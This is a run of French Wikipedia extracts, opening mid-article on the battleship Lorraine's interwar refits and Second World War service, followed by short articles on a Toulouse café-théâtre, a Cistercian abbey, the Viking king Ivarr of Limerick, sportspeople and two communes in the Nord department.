Avec la fin de la Grande guerre et la baisse des budgets, la classe Normandie en construction ne verra pas le jour et la classe Lyon sera abandonnée, ce qui fait des Bretagne les cuirassés les plus avancés de la flotte française au sortir de la guerre.
Il a été envisagé un temps d'envoyer le bâtiment en Mer Noire, avec la Provence dans les manœuvres engagées contre les Bolcheviks, mais les mutineries de la Mer Noire l'empêcha, étant rappelé que les marins, comme tous les militaires, aspirent à la paix après cette longue guerre, même si le rôle de la Marine a souvent considéré comme mineur et moins difficile que celui de l'infanterie.
À la place, les deux cuirassés vont rallier Constantinople en octobre 1919 et vont y former le noyau de l'escadre de Méditerranée orientale jusqu'en juillet 1921.
Première refonte.
Comme pour les autres bâtiments de sa classe, la Lorraine entre rapidement en bassin pour sa première refonte, qui sera différente de celle des autres cuirassés de la classe, car l'élévation de son artillerie principale de 12° à 18° a déjà été réalisée pendant la guerre mondiale.
La refonte dure du 10 novembre 1921 jusqu'au 4 décembre 1922.
Les quatre canons de 138 mm en casemate ont été supprimés, de même que les casemates, le constat ayant été fait qu'en dehors des périodes de beau temps, ces canons étaient constamment inutilisables à cause de la mer. Les canons anti-aériens de 75 mm modèle 1897 ont été remplacés par quatre canons, de même calibre, modèle 1918, positionnés au milieu du navire.
Le mat avant a été remplacé par un mat tripode et son mat arrière modifié pour permettre au cuirassé de mettre en œuvre un ballon captif pour le réglage de son artillerie.
Il a également été installé une direction de tir Vickers équipée d'un télémètre en haut du nouveau mat tripode ainsi que deux télémètres sur chaque côté de la superstructure pour les canons de 138 mm. Il fut tenté d'installer sur les tourelles et , mais sans succès.
Versée dans la réserve dès sa sortie de refonte, elle rejoindra le service actif dès 1923 au sein de la division de la escadre de la Flotte de Méditerranée..
Deuxième refonte.
Le cuirassé fait l'objet d'une modernisation importante entre le 15 novembre 1924 et le 4 août 1926.
Comme lors de la première refonte, il est procédé à l'amélioration de son artillerie principale pour augmenter l'élévation de 18° à 23°, ce qui lui permet d'atteindre une portée de 23.700 mètres. Elle reçoit en outre deux nouveaux télémètres pour sa DCA.
Une partie de son blindage avant est démontée afin d'alléger l'étrave et augmenter son franc-bord avant, alors qu'un groupe de chaudières au charbon est remplacé par des chaudières au mazout et que les catapultes installées sur les batteries principales sont démontées.
À la fin de sa refonte, le cuirassé rejoint son escadre de la Flotte de la Méditerranée.
Troisième refonte.
De nouvelles chaudières à mazout sont installées pendant cette modernisation qui va durer du 17 septembre 1929 au 6 juin 1931, elle verra également l'amélioration de la direction de tir et le remplacement du modèle Vickers par un système français Saint Chamond-Granat, ainsi que de tous les télémètres, à l'exception de ceux présents sur chacun des tourelles. Deux télémètres sont ajoutés au poste de contrôle de l'artillerie, un autre situé en haut du mat avant et un autre à la base du mat arrière. Un télémètre est ajouté au poste de contrôle de l'artillerie pour mesurer la distance entre la cible et les gerbes.
Quatrième refonte.
Elle débute le 18 septembre 1934 pour s'achever le 20 septembre 1935, à Brest et marque la fin des dernières chaudières à charbon sur le bâtiment, qui sont remplacées par des chaudières à mazout plus récentes et plus compactes, ce qui permet de convertir le compartiment de la chaudière en une soute à mazout. Les turbines Pearsons à engrenages sont installées en remplacement des turbines à haute pression.
Les quatre canons de 138 mm situés à l'arrière sont supprimés, de même que leurs casemates, tandis que les quatre canons antiaériens de 75 mm sont remplacés par huit canons du même calibre, modèle 1922. Les tubes lance-torpilles sont également débarqués, un nouveau poste de contrôle de l'artillerie est installé, ainsi que deux directions de tirs pour la DCA avec des télémètres .
La "Lorraine" voit ses superstructures modifiées, la conduite de tir modernisée, la protection de la casemate et du réduit central grandement renforcée, les canons de 340 mm d'origine sont remplacés par des pièces neuves et l'armement antiaérien considérablement mis à jour, (8 canons de 100 mm, qui seront débarquées en 1939 pour équiper le "Richelieu" dont les canons polyvalents de 152 mm ne sont pas encore au point, remplacement d'une partie des canons de 138 mm en casemate, 12 mitrailleuses de 13,2 mm antiaériennes, tandis que les tubes lance-torpilles submersibles qui ne sont plus utilisés sur ce type de bâtiments, sont supprimés. La "Lorraine" perd également sa tourelle centrale au profit d'un hangar qui peut recevoir trois hydravions mis en œuvre grâce à une grue et une catapulte.
Toutes ces modifications, qui ont vocation à prolonger la durée de vie opérationnelle du cuirassé, ne peuvent cependant remédier à des choix de conception, qui sont devenus des défauts avec le temps et notamment la répartition du blindage qui est typique de la guerre mondiale. Celui-ci ne protège plus le bâtiment contre les nouvelles munitions de plus gros calibre, tirées par les adversaires potentiels de la France.
Un choix qui répond à des impératifs budgétaires, une refonte, même coûteuse, l'est moins que la construction d'un nouveau bâtiment. Elle génère un trou capacitaire moins important du fait d'une durée plus courte, à titre de comparaison, la construction du Richelieu depuis le début jusqu'à son lancement a pris trois ans et trois mois.
Mais un choix qui pourra se révéler funeste, ainsi le britannique paiera le prix de sa conception lors de l'affrontement avec le Bismarck, moins d'un an après que la Bretagne, sister-ship de la Lorraine, ait subi le même sort sous les obus du Hood.
La seconde Guerre Mondiale.
La France, avec le statut de puissance navale mondiale (derrière les États-Unis, le Royaume-Uni et le Japon), débute la Seconde Guerre mondiale avec une flotte de cuirassés en plein renouvellement, avec à la fois des bâtiments de ligne très modernes tout juste entrés en service comme le "Dunkerque "et le "Strasbourg " ou en cours d'achèvement comme le "Richelieu" et des unités anciennes, comme la "Lorraine", la "Provence" et la "Bretagne" qui, en dépit de refontes successives, risquent d'être déclassés face à des ennemis plus modernes.
En 1939, la Lorraine est le navire amiral de la de ligne (Brest). Elle rallie Toulon avec sa division, qui est affectée à la de la Flotte de la Méditerranée. Elle participe à des missions d'escorte fin entre l'Algérie et la France puis accompagnera les convois d'or vers Halifax au Canada en .
Après la déclaration de guerre de l'Italie, la "Lorraine" prend part au bombardement du port fortifié de Bardia en Libye, le . Si les dégâts sont peu importants, ce bombardement, comme celui de Gênes souligne la grande vulnérabilité des côtes de l'Italie et de ses colonies. Elle participe ensuite à plusieurs missions, conjointement avec la flotte Britannique, avant la signature par la France de l'armistice avec l'Allemagne.
L'internement à Alexandrie.
À cette date, le cuirassé, basé à Alexandrie avec les trois croiseurs de ("Duquesne", "Tourville", "Suffren"), du croiseur de ("Duguay-Trouin"), des trois torpilleurs de ("Basque", "Forbin", "Fortuné") et d'un sous-marin de ("Protée"), constitue la Force X placée sous les ordres de l'amiral René-Émile Godfroy.
Le 3 juillet 1940, à la suite d'un ordre secret donné par Churchill à la Royal Navy (opération Catapult), celle-ci doit capturer ou neutraliser la Force X. Les bonnes relations qui prévalent entre les deux amiraux Godfroy et Andrew Cunningham permettent d'engager des négociations entre les deux états-majors, qui aboutissent à un compromis. Les Français acceptent de vider leurs soutes à mazout et retirer les mécanismes de tir de leurs canons, en échange de quoi les navires restent sous leur commandement. Cunningham promet de rapatrier les équipages. Les navires restent alors internés à Alexandrie avec des équipages réduits.
Après des accords signés le , toute la Force X bascule dans le camp allié. Commence alors un long trajet par le canal de Suez puis le cap de Bonne Espérance pour la "Lorraine", qui arrive à Dakar le après avoir été contrainte de faire escale à Durban à la suite d'une avarie. Les premières inspections du bâtiment en viennent à la conclusion qu'elle est trop ancienne et surtout trop lente pour être admise à nouveau au service actif. Transformée en navire-école à Mers el-Kebir, l'amirauté envisage même de la cannibaliser pour achever le cuirassé "Jean Bart", tout particulièrement ses canons.
La reprise du combat avec la France combattante.
Elle reprend toutefois du service en , bien que seules 2 tourelles doubles de 340 mm et 8 pièces de 138 mm soient utilisables et servies, sa DCA est renforcée et elle reçoit quatre mitrailleuses de 13.2/76, 14 canons 40/56 Bofors Mk I/III et 25 canons 20/70 Oerlikon Mk II/IV.
Après l'entraînement de son équipage, la "Lorraine" est stationnée dans le port de Tarente en vue d'appuyer le débarquement de Provence des forces alliées, avec les croiseurs "Emile Bertin", "Jeanne d'Arc", "Dugay-Trouin", "Montcalm", "Gloire", "Georges Leygues", complétés par la division de croiseurs légers et 16 torpilleurs, destroyers et avisos.
Dès le , avec la flotte, le cuirassé ouvre le feu sur la batterie de Cepet, sur la presqu'île de Saint-Mandrier, qui reçoit de bombes et obus de marine, dont ceux de la "Lorraine", avant de capituler en une semaine.
Elle rentre dans Toulon libéré le , avant de rejoindre la Force navale française d'intervention du contre-amiral Rué, composée d'elle-même, du croiseur lourd "Duquesne", du croiseur léger , de deux torpilleurs, de deux destroyers d'escorte et de huit dragueurs de mines.
Les forteresses de Sospel et de Castillon, ainsi que les positions allemandes autour de Carqueiranne et de Saint-Tropez sont également la cible de son artillerie principale jusqu'au 17 septembre 1944, date à laquelle le cuirassé rejoint le port de Portsmouth pour une courte modernisation, avant de rejoindre Cherbourg en décembre 1944.
Il prend part à aux opérations "Vénérable" et Vermeille qui débutent le et ouvre le feu sur la poche de Royan, déversant 236 obus de 340 mm, 192 obus de 138 mm et 538 obus de 75 mm, alors que la division française et division américaine mènent l'assaut à terre. La poche tombe finalement le avec la capitulation des forces allemandes de la pointe de Grave.
Le cuirassé rejoint Brest avant de retrouver le port de Toulon.
Après la Seconde Guerre mondiale.
Basée à Toulon, la "Lorraine" est utilisée comme bâtiment d'entraînement au tir dès 1947, puis comme dépôt des équipages, avant d'être rayée des listes de la flotte 17 février 1953.
La "Lorraine" est la dernière survivante de la classe, après la perte de la Bretagne à Mers El Kébir et le sabordage de la Provence à Toulon. Usée par son service et n'ayant plus aucune valeur militaire, La "Lorraine" est vendue pour être démolie dans les chantiers de déconstruction navale de Brégaillon, le 18 décembre 1953.

</doc>
<doc id="6807818" url="https://fr.wikipedia.org/wiki?curid=6807818" title="Restrepo">
Restrepo



</doc>
<doc id="6807819" url="https://fr.wikipedia.org/wiki?curid=6807819" title="Café-théâtre les 3 T">
Café-théâtre les 3 T

Le café-théâtre Les 3 T est une salle de spectacle de Toulouse (Haute-Garonne).
Historique.
Le café-théâtre les 3 T, créé en 1988 et ouvert au public la même année, est conçu sur le modèle du café de la Gare de Paris. Les 3T ont été fondés par Gérard Pinter sur un site propice à la création d'un lieu de spectacle. Les 3 T est un organisme privé.
Le succès rencontré par ce petit théâtre a poussé ses gérants à ouvrir en 2009 une seconde salle juste à côté de la première : "Le 3T d'à côté". Les 3 T ont été associés au "Printemps des Courges", festival d’humour, auquel a succédé "Le Printemps du Rire".
Les 3 T sont aujourd’hui un lieu incontournable du théâtre de divertissement à Toulouse.
Salle.
Le café-théâtre les 3 T comporte 3 salles. La plus grande salle possède 250 places. Il y a deux autres salles de 135 places.
Programme.
Le répertoire des 3T est celui du café-théâtre : des comédies, du burlesque, du one-man-show, spectacles renouvelés mensuellement et ont plusieurs représentations chaque jour. La plupart des pièces représentées sont des succès à Paris. Les droits sont rachetés et les spectacles montés avec la troupe des 3 T.
Troupe.
La troupe est composée d'une cinquantaine de comédiens permanents. 

</doc>
<doc id="6807820" url="https://fr.wikipedia.org/wiki?curid=6807820" title="Matea Magdić">
Matea Magdić

Matea Magdić est une joueuse de volley-ball croate née le à Zagreb. Elle mesure et joue au poste d'attaquante. 

</doc>
<doc id="6807822" url="https://fr.wikipedia.org/wiki?curid=6807822" title="Abbaye de Clairefontaine (Haute-Saône)">
Abbaye de Clairefontaine (Haute-Saône)

L'abbaye de Clairefontaine en Franche-Comté est une abbaye cistercienne d'hommes qui a existé de 1131/1132 à 1791. Elle était située sur le territoire actuel de la commune de Polaincourt-et-Clairefontaine dans le département de la Haute-Saône et dépendait du diocèse de Besançon.
Les bâtiments vendus comme bien national à la Révolution ont été transformés en faïencerie au puis en hôpital psychiatrique à partir de 1938.
Fondation.
L'abbaye de Clairefontaine a été fondée en 1131 ou 1132 par des moines de l'abbaye voisine de Morimond venus à la demande de Guy de Jonvelle, seigneur du lieu : treize religieux, sous la direction du moine Lambert (futur abbé de Morimond puis de Cîteaux), se sont installés en 1132. Les seigneurs de Jonvelle avaient choisi l'église de l'abbaye pour leurs tombeaux.
L'abbaye, bien dotée par divers donateurs - l’empereur Frédéric Barberousse ; Renaud III et Étienne , comtes de Bourgogne ; Guy et Bertrand de Jonvelle ; Hugues et Gislebert de Faucogney, vicomtes de Vesoul ; Henri (frère) et Henri (fils) du comte Frédéric de Bourgogne ; Frédéric et Ferry, comtes de Toul ; Mathieu, duc de Lorraine ; Thierry, archevêque de Besançon..., s'est développée dans les siècles suivants en particulier par l'industrie du fer avec par exemple ses forges de Varigney.
Histoire.
Atteinte par la grande peste de 1348, elle est saccagée en 1359 par les bandes lorraines commandées par Étienne de Vy et des compagnies anglaises durant la guerre de Cent Ans. Pillée par les écorcheurs des grandes compagnies en 1427, accablée par les épidémies, elle est de nouveau mise à sac par les troupes de Louis XI en 1479, puis ruinée par le duc des Deux-Ponts en 1569 au moment des guerres de Religion. Elle est de nouveau ravagée en 1595 par les mercenaires de Tremblecourt qui participent pour le « bon roi Henri IV » à sa guerre contre l’Espagne et, en 1636, elle est brûlée par Bernard de Saxe-Weimar qui envahit la Franche-Comté quand la guerre de Dix Ans fait rage avec ses destructions et ses pestes.
En 1648, elle est mise en commende. L'abbé est nommé par le roi d'Espagne, puis par le roi de France après sa conquête de la Franche-Comté. Le premier abbé commendataire est Laurent-Jean Brun († 1673), doyen de la collégiale de Poligny et chanoine de Besançon. Il ne vivait plus dans ce qui restait de l'abbaye qu'un seul moine. Il essaie de récupérer les biens de l'abbaye et obtient du pape Innocent X, en 1653, une bulle ordonnant la restitution des biens de l'abbaye. Un édit de Jean-Baptiste Colbert, promulgué en 1666, sur le problème des biens de mainmorte, ordonne que le capital des maisons religieuses soit utilisé pour la reconstruction des bâtiments monastiques. En 1679, le nouvel abbé commendataire, Étienne Renoux, obtient du chapitre de Poligny une compensation de pour réaliser des travaux. Les religieux se plaignant de l'insuffisance des travaux exécutés, ils obtiennent du parlement de Besançon la condamnation de l'abbé à réparer l'église et les autres bâtiments réguliers. L'abbé passe un accord le avec les religieux pour définir leurs obligations respectives. Cet accord est complété le . Des travaux importants sont réalisés entre 1689 et 1707 pour un montant total de payés par l'abbé. À la mort de l'abbé Renoux, en 1719, les travaux de rétablissement des bâtiments réguliers ne sont pas terminés. Le nouvel abbé, Antoine-Ignace de Camus († 1748), a passé un nouvel accord avec les moines en 1731 dans lequel il s'engage à « rebâtir et réparer dans vingt ans tous les lieux réguliers de leur monastère tel que dortoir, chambres, réfectoire, cuisine, quartier d'hôtes, bibliothèque, infirmerie, salle capitulaire, porterie ... ».
L'abbaye de Clairefontaine disparaît en 1791 avec la Révolution française et les bâtiments sont vendus comme bien national en 1793 à des négociants locaux qui y établissent une verrerie autorisée par un arrêté du Directoire du . Elle est remplacée, en 1804, par une faïencerie qui fonctionnera jusqu'en 1932. Les bâtiments ont été achetés en 1938 par les Hôpitaux de Seine-et-Marne, et convertis en hôpital psychiatrique appelé aujourd'hui Centre hospitalier spécialisé de Saint-Rémy &amp; Nord Franche-Comté à Polaincourt-et-Clairefontaine.
Protection.
Les façades et les toitures des bâtiments, le vestibule et la galerie Nord du bâtiment central ont été inscrits au titre des monuments historiques le .
Filiation et dépendances.
Clairefontaine est fille de l'abbaye de Morimond
Transformations.
Faïencerie.
En fait, dès 1804 elle devient une faïencerie (faïence fine blanche, dite « porcelaine opaque », et de la faïence fine jaune, dite « grès Nankin ») qui comptera plus de 120 ouvriers en 1890). Les gérants successifs seront Jean-François Estrenne, Jean-Baptiste Rigal, Émile Rigal et ses trois sœurs, Jules Sanejouand, Léon Graves, Mathilde Graves, sa veuve, remariée à Eugène Popoff. La guerre de 14-18 et surtout la crise économique des années 1930 conduisent à la fermeture de l'entreprise en 1932.
Hôpital psychiatrique.
Les bâtiments ont été achetés en 1938 par les Hôpitaux de Seine-et-Marne, "via" la Société Asile de Saint-Remy, et convertis en hôpital psychiatrique qui accueille 125 malades en 1940. Les aménagements se poursuivront en multipliant les places d'accueil sous l'égide de l'Association hospitalière de Franche-Comté (AHFC) qui gère le centre hospitalier spécialisé de Saint-Remy/Clairefontaine.

</doc>
<doc id="6807823" url="https://fr.wikipedia.org/wiki?curid=6807823" title="Ivarr de Limerick">
Ivarr de Limerick

Ivarr de Limerick (), † en 977, est le dernier roi viking de Limerick, et l'avant-dernier « "Roi des Étrangers du Munster" », il règne pendant la montée du pouvoir du Dál gCais et le déclin des Eóganachta. Il tente d'imposer son pouvoir sur Limerick et de l'étendre sur l'ensemble de la province du Munster il est de ce fait l'un des principaux protagonistes de la chronique du et œuvre de propagande irlandaise nommée Cogad Gáedel re Gallaib, comme ennemi de Mathgamain mac Cennétig, prétendant au trône de roi de Munster, et de son très célèbre jeune frère et successeur Brian Bóruma.
Selon l'auteur anonyme du Cogad Gáedel re Gallaib, Ivar se proclame lui-même comme « Roi de Munster » pendant quelque temps dans la décennie 960, jusqu'à ce qu'il soit mis en déroute lors de la bataille de Sulcoit en 967, toutefois cette extraordinaire revendication a été mise en doute par les spécialistes contemporains. Il apparaît être revenu à Limerick, pour se rétablir, seulement un an ou deux après sa défaite.
Les sources.
Les deux principales sources sur la carrière d'Ivar sont le Cogad Gáedel re Gallaib du début du et la confirmation des faits qu'il rapporte par les Annales d'Inisfallen. Les deux semblent avoir été utilisés comme sources primaires d'annales ultérieures comme les Chroniques d'Irlande dont elles constituent le matériel d'informations sur le Munster concerné. Malheureusement, cependant, bien que l'auteur du "Cogad" fasse une large utilisation de ces annales, et d'autres sources locales maintenant perdues, comme des poésies contemporaines, son propos est politique et a pour but de glorifier Brian et le Dál gCais au bénéfice de son descendant Muircheartach Ua Briain, si bien les éléments issus des annalistes sont déformés par les exagérations, un langage fleuri et des informations douteuses de diverses origines.
Le principal problème des Annales d'Inisfallen, est l'importante abréviation qu'elles ont subie lors de leur rédaction par rapport à l'original. Les Annales d'Inisfallen souffrent également d'une considérable lacune ou simplement d'un trou ne comprenant aucune entrée, sur deux ans et demi particulièrement critiques de la carrière d'Ivar entre le milieu de 969 et le début de 972.
La troisième source importante pour l'histoire du Munster dans cette période est les Annales des quatre maîtres, mais elles ont été compilées beaucoup plus tard et sont parfois de crédibilité douteuse, ayant enregistré dans certains cas des interpolations et/ou des déplacements chronologiques d'entrées. Quelques autres sources mentionnent brièvement Ivar mais elles n'apportent pas d'éléments complémentaires intéressants pour notre connaissance sur lui. les Annales de Tigernach auraient pu être d'un bon secours mais elles souffrent d'une lacune entre 766 et 974.
Origine.
L'origine d'Ivar n'est pas mentionnée par les Chroniques d'Irlande, qui n'ont pas toutefois été conservées dans leur intégralité, mais il est généralement reconnu comme un membre de la prolifique dynastie viking nommée par les historiens contemporains les Uí Ímair.
Dans le "Cogad" et les textes liés il est nommé Ímar ua (h)Ímair 'est-à-dire "Ímar, petit-fils Ímar", mais cela peut être également interprété comme Ímar Ua hÍmair, l'utilisation d'un surnom signifiant « Descendant d'Ímar », n'est pas un cas isolé et a apparemment été pratiquée par d'autres membres de la dynastie.
Sa relation exacte avec les souverains précédents de Limerick est incertaine, le dernier membre de la dynastie de la ville est connu comme Aralt mac Sitric, et meurt en 940 il est généralement considéré comme le de Sigtryggr Caoch (mort en 927), roi de Dublin et ensuite roi de Northumbria.
Le problème de considérer Ivar littéralement comme un petit-fils d'Ímar mort en 873 se heurte au fait que dans ce cas il aurait été extrêmement vieux lors de son décès en 977. Un homonyme de cet Ímar (), nommé Ímar II ua Ímair, tué en Écosse en 904, doit être de manière plus plausible considéré comme son grand-père, dans ce cas il n'est pas besoin de corriger la forme "ua Ímair" du "Cogad". Au moins deux générations entre le roi de Limerick et le fondateur de la dynastie sont indispensables.
Postérité.
Peut-être à la suite de la trahison et du meurtre de Mathgamain l'année précédente, Ivar et deux de ses fils, Amlaíb/Olaf connu aussi sous le nom gaélique de Cuallaid (c'est-à-dire "Chien sauvage") et Dubcenn (gaélique "Tête Noire"), sont tués, apparemment après avoir été surpris par Brian en 977 dans l'établissement religieux de l'île Scattery,
Les sagas mentionnent un autre de ses fils, Aralt, qui est élu "Roi des Étrangers de Munster" peu après le meurtre d'Ivar. il est réputé avoir péri lors d'un combat contre l'armée de Brian avec Donnubán lors de la bataille de Cathair Cuan, probablement quelque part en Uí Fidgenti.
Un fils de Dubcenn, nommé Osli (Auisle&lt; Ásl/Auðgísl), est évoqué dans la saga ensuite comme « haut sénéchal » de Brian, qui avait peut-être placé sous son contrôle le royaume de Mide, quand il est tué par Flaithbertach Ua Néill vers 1012. Un autre fils de Dubcenn doit être cet Amond, sans doute tué en combattant aux côtés de Brian lors de la bataille de Clontarf en 1014.
Ivar est réputé être l'ancêtre d'une descendance noble en Irlande les O'Donovan. Sa fille dont le nom n'a pas été retenu, a épousé son allié Donnubán mac Cathail roi des Uí Fidgenti, leur ancêtre éponyme, bien qu'elle puisse être aussi la fille d'Olaf le fils d'Ivar, une possibilité envisagée par les généalogies. En tout état de cause une fille de cette princesse et de Donnubán, épouse ensuite Ivarr de Waterford et lui donne plusieurs enfants.
Sources.
, édition du .=

</doc>
<doc id="6807836" url="https://fr.wikipedia.org/wiki?curid=6807836" title="Park Yong-kyun">
Park Yong-kyun

Park Yong-kyun est un boxeur sud-coréen né le à Séoul.
Carrière.
Champion de Corée et d'Asie OPBF des poids plumes en 1989 et 1990, il devient champion du monde WBA de la catégorie le après sa victoire aux points contre Antonio Esparragoza. Park conserve son titre à 8 reprises avant de s'incliner face à Eloy Rojas le . Il met un terme à sa carrière après une seconde défaite lors du combat revanche le sur un bilan de 28 victoires, 3 défaites et 1 match nul.

</doc>
<doc id="6807839" url="https://fr.wikipedia.org/wiki?curid=6807839" title="XYZ Films">
XYZ Films

XYZ Films est une société de production de cinéma indépendant américaine fondée en 2008 par Nate Bolotin, Nick Spicer, Aram Tertzakian et Todd Brown. 

</doc>
<doc id="6807843" url="https://fr.wikipedia.org/wiki?curid=6807843" title="Joseph Allard">
Joseph Allard

Joseph Allard peut désigner :

</doc>
<doc id="6807844" url="https://fr.wikipedia.org/wiki?curid=6807844" title="Marija Jovanović (volley-ball)">
Marija Jovanović (volley-ball)

Marija Jovanović est une joueuse de volley-ball serbe née le à Kosovska Mitrovica (Kosovo). Elle mesure et joue au poste d'attaquante.

</doc>

<doc id="191666" url="https://fr.wikipedia.org/wiki?curid=191666" title="Saint-Benin">
Saint-Benin

Saint-Benin est une commune française située dans le département du Nord (59), en région Hauts-de-France.
Ses habitants se nomment les Béninois(es).
Géographie.
Situation.
Saint-Benin est un village du Cambrésis, dans le sud du département du Nord, jouxtant au sud Le Cateau-Cambrésis et situé dans la vallée de la Selle, à à vol d'oiseau au sud-est de Cambrai, au sud de Valenciennes, au sud-ouest de la frontiière Franco-belge et à de Mons, au sud-ouest de Maubeuge, à l'ouest d'Avesnes-sur-Helpe et à au nord-est de Saint-Quentin.
La ligne de Creil à Jeumont, marquée par son viaduc, passe dans la commune, mais la station de chemin de fer la plus proche est la gare du Cateau, desservie par des trains TER Hauts-de-France, qui effectuent des relations entre les gares de Busigny et de Jeumont ainsi que de Busigny et d'Aulnoye-Aymeries ou de Maubeuge. Un train TER, en provenance de Paris-Nord et en direction de Maubeuge, y marque un arrêt les samedis, dimanches et fêtes.
Il est traversé par le sentier de grande randonnée GR 655 ou "Via Turonensis".
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par la Selle ou Escaut et la Rivièrette des Essarts.
La Selle, d'une longueur de , prend sa source dans la commune de Molain et se jette dans le canal de l'Escaut à Denain, après avoir traversé .
Un étang privé pour la pêche à la truite, l'étang de Saint-Crépin, se trouve sur la commune. La nappe phréatique de Saint-Benin alimente en eaux la ville de Caudry.
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Escaut ». Ce document de planification concerne un territoire de de superficie, délimité par le bassin versant de l'Escaut. Le périmètre a été arrêté le et le SAGE proprement dit a été approuvé le . La structure porteuse de l'élaboration et de la mise en œuvre est le syndicat mixte Escaut et Affluents (SyMEA).
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat océanique altéré et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune de Saint-Hilaire-sur-Helpe à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Saint-Benin est catégorisée commune rurale à habitat dispersé, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle est située hors unité urbaine. Par ailleurs la commune fait partie de l'aire d'attraction du Cateau-Cambrésis, dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de moins de .
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (92 % en 2018), en diminution par rapport à 1990 (93,3 %). La répartition détaillée en 2018 est la suivante : 
terres arables (53,6 %), prairies (31,2 %), zones urbanisées (7,6 %), zones agricoles hétérogènes (7,2 %), zones industrielles ou commerciales et réseaux de communication (0,4 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Habitat et logement.
En 2014 et 2019, le nombre total de logements dans la commune était de 170, alors qu'il était de 167 en 2009.
Parmi ces logements, 87 % étaient des résidences principales, 2,9 % des résidences secondaires et 10 % des logements vacants. Ces logements étaient pour 98,2 % d'entre eux des maisons individuelles et pour 1,2 % des appartements.
Le tableau ci-dessous présente la typologie des logements à Saint-Benin en 2019 en comparaison avec celle du Nord et de la France entière. Une caractéristique marquante du parc de logements est ainsi une proportion de résidences secondaires et logements occasionnels (2,9 %) supérieure à celle du département (1,6 %) et à celle de la France entière (9,7 %). Concernant le statut d'occupation de ces logements, 76,3 % des habitants de la commune sont propriétaires de leur logement (78,8 % en 2014), contre 54,7 % pour le Nord et 57,5 pour la France entière.
Histoire.
Temps modernes.
Sous l'Ancien Régime, la majeure partie des terres appartient à l'Église. En raison de sa proximité avec le Cateau-Cambrésis, Saint Benin pâtit des attaques dirigées contre la ville. Le village est pillé pendant la prise du Cateau en 1637 par les français.
Époque contemporaine.
À partir de la seconde moitié du la population de Saint Benin habituée à un dur labeur trouve à s'embaucher dans les usines du Cateau-Cambrésis, soit dans l'usine de céramique, fondée en 1868 par Felix Simons, natif de Saint Benin, soit dans l'émaillerie Dupont qui fabrique des baignoires en fonte émaillée. Cette entreprise est reprise par Chappée en 1930.
Le village a été décoré de la Croix de guerre 1914-1918 le .
Pendant la Seconde Guerre mondiale, compte tenu de son enjeu stratégique, le viaduc ferroviaire est constamment gardé par un poste de surveillance allemand.
Politique et administration.
Rattachements administratifs et électoraux.
Rattachements administratifs.
La commune se trouve dans l'arrondissement de Cambrai du département du Nord.
Elle faisait partie depuis 1793 du canton du Cateau-Cambrésis. Dans le cadre du redécoupage cantonal de 2014 en France, cette circonscription administrative territoriale a disparu, et le canton n'est plus qu'une circonscription électorale.
Rattachements électoraux.
Pour les élections départementales, la commune fait partie depuis 2014 d'un nouveau canton du Cateau-Cambrésis
Pour l'élection des députés, elle fait partie de la dix-huitième circonscription du Nord.
Intercommunalité.
Saint-Benin était membre de la communauté de communes du Pays de Matisse, un établissement public de coopération intercommunale (EPCI) à fiscalité propre créé en 1993 et auquel la commune avait transféré un certain nombre de ses compétences, dans les conditions déterminées par le code général des collectivités territoriales.
Cette intercommunalité a fusionné avec sa voisine pour former, le , la "communauté de communes du Caudrésis – Catésis", qui se transforme en 2019 en communauté d'agglomération sous le nom de communauté d'agglomération du Caudrésis - Catésis dont est désormais membre la commune.
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 31,9 %, soit en dessous de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 25,0 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 50,73 % d'hommes, largement supérieur au taux départemental (48,23 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.
Manifestations culturelles et festivités.
La fête communale a lieu le deuxième dimanche de juin.
Culture locale et patrimoine.
Sobriquet des habitants.
Le nom jeté des habitants de Saint-Benin est les "Bafious" (qui bavent, qui parlent à tort et à travers).

</doc>
<doc id="191668" url="https://fr.wikipedia.org/wiki?curid=191668" title="Saint-Souplet">
Saint-Souplet

Saint-Souplet, également appelée Saint-Souplet-Escaufourt, est une commune française située dans le département du Nord, en région Hauts-de-France.
Le gentilé de ses habitants est "Sulpiciens". Le nom jeté en est les "Minteux" (menteurs en ch'ti).
Géographie.
Saint-Souplet-Escaufourt est située sur la route départementale 115. Elle fait partie du canton du Cateau-Cambrésis, à 6 km du Cateau, 30 km au sud-est de Cambrai et à 86 km de Lille.
